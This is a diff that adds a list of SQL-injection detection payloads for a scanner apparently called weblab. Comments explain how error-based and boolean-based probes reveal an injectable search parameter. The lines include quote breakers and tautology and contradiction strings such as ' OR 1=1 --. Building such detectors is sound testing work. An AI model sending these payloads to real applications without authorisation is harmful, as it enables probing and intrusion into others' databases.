@@ -1,0 +1,32 @@
+# SQL-injection DETECTION payloads for weblab's sqli engine.
+#
+# One payload per non-comment line; blank lines and lines starting with '#'
+# are ignored. These are the inputs the detector tinkers into the /search?q=
+# sink to make the database misbehave OBSERVABLY:
+#
+#   * error-based  -- a lone/odd quote breaks the SQL string and the app leaks
+#                     the parser error ("SQL error: ..."), proving the input is
+#                     concatenated straight into the query.
+#   * boolean      -- a tautology vs. a contradiction appended after a known
+#                     prefix change the result set size, proving the WHERE clause
+#                     is attacker-controlled even when no error is shown (blind).
+#
+# The trailing "-- " (note the space) is a SQL line comment that swallows the
+# app's own trailing "%'" so our injected clause is the end of the statement.
+
+# --- error-based: unbalanced quotes / syntax breakers ---
+'
+"
+')
+';
+' OR
+1'
+
+# --- boolean-based: tautology (matches) ---
+' OR 1=1 --
+' OR '1'='1
+admin' AND '1'='1' --
+
+# --- boolean-based: contradiction (no match) ---
+' OR 1=2 --
+admin' AND '1'='2' --
